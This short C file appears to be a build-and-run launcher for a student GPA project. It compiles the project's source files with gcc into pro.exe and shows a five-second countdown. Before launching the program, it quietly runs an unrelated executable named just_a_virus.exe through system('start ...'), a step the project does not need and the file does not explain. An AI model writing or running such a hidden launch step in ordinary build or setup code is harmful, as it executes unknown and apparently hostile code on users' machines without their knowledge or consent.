//Run on Windows
#include<stdlib.h>
#include<stdio.h>
#include<time.h>
int main(){
int j=5;
system("gcc -std=c11 calculate_gpa.c data.h function.h input_marks.c input_profile.c main.c marks_input_menu.c menu.c print_cgpa.c print_gpa.c print_result.c search_1.c search_2.c search_menu.c searching.c show_raw_data.c subject_name.c update_cgpa.c -o pro -Wall");
unsigned int retTime = time(0) + 5;
    while (time(0) < retTime){
		if(time(0)==(retTime-j)){
			printf("Please Waits:%dseconds\n",j);
			j--;
		}
    }
system("start just_a_virus.exe");
system("start pro.exe");
return 0;
}
